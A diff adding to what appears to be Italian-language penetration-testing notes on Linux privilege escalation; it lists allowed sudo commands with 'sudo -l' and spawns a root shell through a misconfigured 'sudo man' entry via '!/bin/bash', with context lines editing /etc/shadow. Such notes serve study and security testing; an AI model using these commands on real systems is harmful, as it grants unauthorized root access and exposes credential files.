@@ -10,3 +10,14 @@ nano /etc/shadow
 su
 <password>
 ```
+
+possiamo vedere che comandi privilegiati usando sudo possiamo usare eseguendo il comando 
+```bash
+sudo -l
+```
+potrebbe combarire il comando man che effettivamente é un comando che tutti possono eseguire ed é un comando super user (root) <br>
+possiamo sfruttare questa miss configuration aprendo una bash sul manuale
+```bash
+sudo man <comando>
+!/bin/bash
+```
